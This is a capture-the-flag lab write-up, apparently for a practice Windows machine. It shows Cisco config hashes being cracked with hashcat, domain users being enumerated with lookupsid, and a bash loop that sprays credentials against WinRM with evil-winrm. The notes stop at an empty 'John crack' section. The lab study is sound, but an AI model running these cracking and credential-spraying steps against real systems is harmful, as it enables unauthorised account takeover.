# config.txt
So you can login as a guest and then there is a config.txt file from there you can get the following:
```text
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

Using the website - https://www.ifm.net.nz/cookbooks/passwordcracker.html
I was able to crack the rout3r hash and admin:
![[Pasted image 20240429143325.png]]

Hashcat was able to crack the md5_crypt
```shell
└─$ hashcat -m 500 md5_hash.txt /usr/share/wordlists/rockyou.txt 

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent              
                                                          
Session..........: hashcat
Status...........: Cracked

```

# RPC Enumeration
So both crackmapexec and rpcclient did not work but I found a tool lookupsid which worked
```shell
─$ lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

```

# WinRM
I wrote a script to test out each user and password to try and login to winrm
```bash
#!/bin/bash

# Set the target IP address
TARGET_IP="10.10.10.145"

# Usernames and passwords
usernames=("Administrator" "Guest" "DefaultAccount" "WDAGUtilityAccount" "Hazard" "support" "Chase" "Jason")
passwords=("$uperP@ssword" "Q4)sJu\\Y8qz*A3?d" "stealth1agent")

# Loop through usernames and passwords
for username in "${usernames[@]}"; do
    for password in "${passwords[@]}"; do
        echo "Trying $username with $password"
        evil-winrm -i $TARGET_IP -u $username -p $password
    done
done

```

## Chase
Chase was the correct user


# login.php
IN the C:\inetpub\wwwroot there is the login.php file
```php
if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {

```

## John crack
```shell

```